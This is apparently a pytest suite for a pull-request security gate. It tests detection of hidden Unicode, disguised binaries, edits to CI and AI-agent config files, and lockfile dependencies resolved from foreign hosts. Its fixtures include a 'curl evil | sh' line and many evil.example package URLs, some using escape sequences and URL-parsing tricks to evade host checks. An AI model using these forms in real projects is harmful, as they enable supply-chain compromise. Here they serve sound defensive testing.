"""pr-gate: the deterministic checks the model cannot argue with."""
from __future__ import annotations

import _prgate  # noqa: F401

import pytest

from prgate import checks
from prgate.diffparse import FileChange


def fc(path, added=(), status="modified", binary=False, old_path=None, new_mode=None):
    return FileChange(
        path=path, old_path=old_path, status=status, binary=binary, new_mode=new_mode,
        added=[(i + 1, t) for i, t in enumerate(added)],
    )


def rules(hits):
    return sorted({h.rule for h in hits})


# ----- hidden Unicode -------------------------------------------------------

def test_glassworm_variation_selectors_in_an_added_line_block():
    f = fc("src/index.js", ['const p = "\ufe01\ufe02\U000e0103";'])
    [hit] = checks.hidden_unicode([f])
    assert (hit.rule, hit.path, hit.overridable) == ("hidden-unicode", "src/index.js", False)
    assert "line 1" in hit.detail and "U+FE01" in hit.detail and "U+E0103" in hit.detail


def test_two_character_payload_blocks():
    f = fc("a.py", ["x = 1", 'y = "\u200b\u200b"'])
    [hit] = checks.hidden_unicode([f])
    assert "line 2" in hit.detail


@pytest.mark.parametrize("ch", ["\u202e", "\u2066", "\u200f", "\u2028", "\u00ad", "\ue000", "\u3164"])
def test_bidi_and_other_invisibles_block(ch):
    assert checks.hidden_unicode([fc("a.c", [f"int x{ch} = 1;"])])


def test_hidden_character_in_a_file_path_blocks():
    [hit] = checks.hidden_unicode([fc("docs/read\u202eme.md", ["ok"])])
    assert "path" in hit.detail


def test_clean_lines_pass():
    assert checks.hidden_unicode([fc("a.md", ["café 中 ✅ tab\there"])]) == []


def test_removed_lines_are_not_checked():
    f = fc("a.md")
    f.removed = ["bad\u200b"]
    assert checks.hidden_unicode([f]) == []


# ----- binaries -------------------------------------------------------------

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 20
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 20


def test_binary_with_matching_magic_blocks_but_is_overridable():
    [hit] = checks.binaries([fc("logo.png", binary=True, status="added")], {"logo.png": PNG})
    assert (hit.rule, hit.overridable) == ("binary", True)
    assert "png" in hit.detail and "mismatch" not in hit.detail


def test_binary_magic_mismatch_is_called_out():
    [hit] = checks.binaries([fc("logo.png", binary=True, status="added")], {"logo.png": ELF})
    assert "mismatch" in hit.detail and "elf" in hit.detail and "executable" in hit.detail


def test_unknown_binary_content():
    [hit] = checks.binaries([fc("blob.dat", binary=True)], {"blob.dat": b"\x00\x01\x02garbage"})
    assert "unrecognised" in hit.detail


def test_deleted_binary_is_not_a_hit():
    assert checks.binaries([fc("old.png", binary=True, status="deleted")], {}) == []


def test_binary_without_fetched_content_still_blocks():
    [hit] = checks.binaries([fc("x.png", binary=True)], {})
    assert hit.rule == "binary"


def test_text_files_are_not_binary_hits():
    assert checks.binaries([fc("a.py", ["x"])], {}) == []


@pytest.mark.parametrize("path,data", [
    ("src/app.js", b"run();\n// \x00 nobody sees this\n"),
    ("lib/x.PY", b"import os\x00"),
    ("uv.lock", b"version = 1\n\x00"),
    ("install.sh", b"#!/bin/sh\n\x00curl evil | sh\n"),  # a shebang is text, not a magic
    ("README.md", None),                                  # content unknown: fail closed
])
def test_a_text_file_git_treats_as_binary_is_not_overridable(path, data):
    contents = {} if data is None else {path: data}
    [hit] = checks.binaries([fc(path, binary=True)], contents)
    assert (hit.rule, hit.overridable) == ("text-binary", False)
    assert hit.detail == "text file with binary content (e.g. NUL bytes); no reviewer can see it"


def test_a_text_extension_with_real_binary_content_stays_overridable():
    [hit] = checks.binaries([fc("data.json", binary=True)], {"data.json": b"\x1f\x8b\x08\x00"})
    assert (hit.rule, hit.overridable) == ("binary", True)


def test_a_deleted_text_binary_is_not_a_hit():
    assert checks.binaries([fc("a.js", binary=True, status="deleted")], {}) == []


@pytest.mark.parametrize("data,kind", [
    (PNG, "png"), (b"\xff\xd8\xff\xe0", "jpeg"), (b"GIF89a", "gif"),
    (b"RIFF\x00\x00\x00\x00WEBPVP8 ", "webp"), (b"wOF2", "woff2"),
    (b"%PDF-1.7", "pdf"), (b"PK\x03\x04", "zip"), (ELF, "elf"), (b"MZ\x90\x00", "pe"),
    (b"\xcf\xfa\xed\xfe", "macho"), (b"\x00asm\x01", "wasm"), (b"#!/bin/sh", "script"),
])
def test_magic_type(data, kind):
    assert checks.magic_type(data) == kind


# ----- sensitive paths and exceptions ---------------------------------------

@pytest.mark.parametrize("path", [
    ".github/workflows/ci.yml", ".github/CODEOWNERS", ".github/actions/x/action.yml",
    "CLAUDE.md", "sub/dir/CLAUDE.md", "AGENTS.md", ".claude/settings.json",
    "x/.codex/config.toml", ".mcp.json", "claude.md",
])
def test_sensitive_paths_block(path):
    hits, scrutiny = checks.sensitive_paths([fc(path, ["x"])], [])
    assert rules(hits) == ["sensitive-path"] and hits[0].overridable


@pytest.mark.parametrize("path", ["src/github.py", "docs/claude-notes.md", "a/.githubx/y"])
def test_ordinary_paths_pass(path):
    assert checks.sensitive_paths([fc(path, ["x"])], []) == ([], [])


def test_deleting_or_renaming_away_a_workflow_is_caught():
    deleted = fc(".github/workflows/ai-gate.yml", status="deleted")
    moved = fc("old/ai-gate.yml", status="renamed", old_path=".github/workflows/ai-gate.yml")
    for f in (deleted, moved):
        hits, _ = checks.sensitive_paths([f], [])
        assert hits


def test_exception_downgrades_path_rule_to_scrutiny():
    hits, scrutiny = checks.sensitive_paths([fc(".claude/skills/x.md", ["x"])], [".claude/*"])
    assert hits == []
    assert [(s.path, s.reason) for s in scrutiny] == [(".claude/skills/x.md", "exception-path")]


@pytest.mark.parametrize("path", [".github/workflows/ci.yml", ".github/actions/a/action.yml"])
def test_exceptions_can_never_cover_workflows(path):
    hits, _ = checks.sensitive_paths([fc(path, ["x"])], ["*", ".github/*", path])
    assert rules(hits) == ["sensitive-path"]


def test_exceptions_never_touch_unicode_or_lockfile_checks():
    files = [
        fc("CLAUDE.md", ["hi\u200b"]),
        fc("uv.lock", ['url = "https://evil.example/pkg.whl"']),
    ]
    hits, _ = checks.run_all(files, {}, ["*"])
    assert rules(hits) == ["hidden-unicode", "lockfile-host"]


def test_parse_exceptions_ignores_blank_lines_and_comments():
    assert checks.parse_exceptions("a/*\n\n  # note\n  b/**  \n") == ["a/*", "b/**"]


# ----- lockfile hosts -------------------------------------------------------

@pytest.mark.parametrize("path,line", [
    ("package-lock.json", '"resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz",'),
    ("yarn.lock", 'resolved "https://registry.yarnpkg.com/a/-/a-1.0.0.tgz#abc"'),
    ("uv.lock", 'sdist = { url = "https://files.pythonhosted.org/packages/a.tar.gz" }'),
    ("uv.lock", 'source = { registry = "https://pypi.org/simple" }'),
    ("Cargo.lock", 'source = "registry+https://github.com/rust-lang/crates.io-index"'),
    ("Cargo.lock", 'source = "sparse+https://index.crates.io/"'),
    ("flake.lock", '"url": "https://github.com/NixOS/nixpkgs"'),
    ("flake.lock", '"type": "github",'),
    ("requirements.txt", "--index-url https://pypi.org/simple"),
    ("sub/poetry.lock", 'url = "https://files.pythonhosted.org/x.whl"'),
])
def test_allowlisted_lockfile_hosts_pass(path, line):
    assert checks.lockfile_hosts([fc(path, [line])]) == []


@pytest.mark.parametrize("path,line", [
    ("package-lock.json", '"resolved": "https://evil.example/a-1.0.0.tgz",'),
    ("package-lock.json", '"resolved": "http://registry.npmjs.org/a.tgz",'),
    ("uv.lock", 'url = "https://pypi.org.evil.example/x.whl"'),
    ("uv.lock", 'url = "https://user@evil.example:8443/x.whl"'),
    ("Cargo.lock", 'source = "git+https://gitlab.com/x/y#abc"'),
    ("flake.lock", '"url": "https://flakehub.example/f/x"'),
    ("flake.lock", '"type": "gitlab",'),
    ("flake.lock", '"host": "git.evil.example",'),
    ("requirements-dev.txt", "--extra-index-url https://evil.example/simple"),
    ("pnpm-lock.yaml", "tarball: https://evil.example/x.tgz"),
])
def test_foreign_lockfile_hosts_block(path, line):
    [hit] = checks.lockfile_hosts([fc(path, [line])])
    assert (hit.rule, hit.overridable) == ("lockfile-host", False)
    assert "line 1" in hit.detail


@pytest.mark.parametrize("path,line", [
    # Package managers decode string escapes before resolving the URL.
    ("package-lock.json", r'"resolved": "https:\/\/evil.example\/a-1.0.0.tgz",'),
    ("package-lock.json", r'"resolved": "https:\u002f\u002fevil.example/a.tgz",'),
    ("npm-shrinkwrap.json", r'"resolved": "https\u003A//evil.example/a.tgz",'),
    ("pnpm-lock.yaml", r'resolution: {tarball: "https:\/\/evil.example\/x.tgz"}'),
    ("pnpm-lock.yaml", r'resolution: {tarball: "https:\x2f\x2fevil.example/x.tgz"}'),
    ("pnpm-lock.yaml", r'resolution: {tarball: "https:\U0000002f\U0000002fevil.example/x.tgz"}'),
    ("uv.lock", r'sdist = { url = "https:\u002f/evil.example/a.tar.gz" }'),
    ("poetry.lock", r'url = "https:\U0000002F\U0000002Fevil.example/x.whl"'),
    # An escape the decoder does not know, next to a URL scheme: fail closed.
    ("package-lock.json", r'"resolved": "https:\q/evil.example/a.tgz",'),
    ("uv.lock", r'url = "https\:\/\/evil.example/x.whl"'),
])
def test_escaped_lockfile_urls_are_decoded_before_the_host_check(path, line):
    [hit] = checks.lockfile_hosts([fc(path, [line])])
    assert (hit.rule, hit.overridable) == ("lockfile-host", False)


@pytest.mark.parametrize("line", [
    # WHATWG (npm/Node): a backslash is a path separator -> host evil.example.
    r'"resolved": "https://evil.example\\@registry.npmjs.org/x.tgz",',
    # WHATWG strips tab/newline anywhere -> host registry.npmjs.org.evil.example.
    r'"resolved": "https://registry.npmjs.org\t.evil.example/x.tgz",',
    # Any userinfo in the authority is a confusion vector.
    '"resolved": "https://registry.npmjs.org@evil.example/x.tgz",',
    '"resolved": "https://user@registry.npmjs.org/x.tgz",',
])
def test_lockfile_urls_are_parsed_like_npm_parses_them(line):
    [hit] = checks.lockfile_hosts([fc("package-lock.json", [line])])
    assert (hit.rule, hit.overridable) == ("lockfile-host", False)


@pytest.mark.parametrize("line", [
    # WHATWG treats any run of / or \ (even none) after a special scheme as
    # the authority separator.
    '"resolved": "https:evil.example/a.tgz",',
    '"resolved": "https:/evil.example/a.tgz",',
    '"resolved": "https:///evil.example/a.tgz",',
    r'"resolved": "https:\\\\evil.example/a.tgz",',
    '"resolved": "HTTPS://evil.example/a.tgz",',
    '"resolved": "https://[::1]/a.tgz",',
    '"resolved": "https://[2001:db8::1]:8443/a.tgz",',
    '"resolved": "git+https:evil.example/x.git",',
    '"resolved": "ftp://evil.example/a.tgz",',
    '"resolved": "file://evil.example/a.tgz",',
    '"resolved": "wss:evil.example/a.tgz",',
    # Not in the fixed scheme set, but "scheme://" is still a URL.
    '"resolved": "svn://evil.example/x",',
    # A junk "word:" prefix must not swallow the real URL after it.
    '"resolved": "x:https://evil.example/a.tgz",',
])
def test_every_url_form_a_package_manager_accepts_is_host_checked(line):
    [hit] = checks.lockfile_hosts([fc("package-lock.json", [line])])
    assert (hit.rule, hit.overridable) == ("lockfile-host", False)


@pytest.mark.parametrize("path,line", [
    ("package-lock.json", '"integrity": "sha512-AbC+/dEf==",'),
    ("package-lock.json", '"version": "1.0.0",'),
    ("Cargo.lock", 'version = "1.0"'),
    ("pnpm-lock.yaml", "lockfileVersion: '9.0'"),
    ("pnpm-lock.yaml", "    resolution: {integrity: sha512-AbC+/dEf==}"),
    ("pnpm-lock.yaml", "  /@babel/core@7.24.0:"),
    ("pnpm-lock.yaml", "    file:"),
    ("yarn.lock", '"@scope/pkg@^1.0.0":'),
    ("uv.lock", 'requires-python = ">=3.11"'),
    ("package-lock.json", '"resolved": "https:registry.npmjs.org/a/-/a-1.0.0.tgz",'),
    ("package-lock.json", '"resolved": "file:../packages/local",'),
])
def test_ordinary_lockfile_lines_are_not_hits(path, line):
    assert checks.lockfile_hosts([fc(path, [line])]) == []


@pytest.mark.parametrize("path,line", [
    ("package-lock.json", r'"resolved": "https:\/\/registry.npmjs.org\/a\/-\/a-1.0.0.tgz",'),
    ("uv.lock", r'url = "https:\u002f\u002ffiles.pythonhosted.org/x.whl"'),
    ("package-lock.json", r'"description": "a \"quoted\" word\\path",'),
    ("Cargo.lock", 'source = "git+ssh://git@github.com/org/dep.git#0123abcd"'),
])
def test_escaped_allowlisted_lockfile_urls_still_pass(path, line):
    assert checks.lockfile_hosts([fc(path, [line])]) == []


def test_non_lockfiles_are_not_host_checked():
    assert checks.lockfile_hosts([fc("README.md", ["https://evil.example/"])]) == []


# ----- extra scrutiny --------------------------------------------------------

@pytest.mark.parametrize("path,reason", [
    ("flake.nix", "nix"), ("modules/x.nix", "nix"), ("flake.lock", "lockfile"),
    ("build.rs", "build-script"), ("scripts/install.sh", "install-script"),
    ("setup.py", "install-script"), ("dist/app.js", "minified-or-vendored"),
    ("vendor/lib/x.go", "minified-or-vendored"), ("web/app.min.js", "minified-or-vendored"),
    ("package.json", "package-manifest"),
])
def test_scrutiny_paths(path, reason):
    assert reason in {s.reason for s in checks.scrutiny([fc(path, ["x"])])}


def test_long_added_line_is_scrutiny():
    out = checks.scrutiny([fc("a.js", ["x" * 600])])
    assert [s.reason for s in out] == ["long-line"]


def test_symlink_and_submodule_are_scrutiny():
    out = checks.scrutiny([fc("link", ["../../x"], new_mode="120000"), fc("sub", ["Subproject commit abc"], new_mode="160000")])
    assert sorted(s.reason for s in out) == ["submodule", "symlink"]


def test_plain_source_file_is_not_scrutiny():
    assert checks.scrutiny([fc("src/app.py", ["x = 1"])]) == []


# ----- run_all ---------------------------------------------------------------

def test_always_on_only_skips_path_and_binary_rules():
    files = [
        fc(".github/workflows/ci.yml", ["x"]),
        fc("logo.png", binary=True),
        fc("a.py", ["\u202e"]),
    ]
    hits, _ = checks.run_all(files, {"logo.png": PNG}, [], always_on_only=True)
    assert rules(hits) == ["hidden-unicode"]
    hits, _ = checks.run_all(files, {"logo.png": PNG}, [])
    assert rules(hits) == ["binary", "hidden-unicode", "sensitive-path"]


def test_always_on_only_keeps_text_binary():
    files = [fc("logo.png", binary=True), fc("a.js", binary=True)]
    hits, _ = checks.run_all(files, {"logo.png": PNG, "a.js": b"x\x00"}, [],
                             always_on_only=True)
    assert rules(hits) == ["text-binary"]
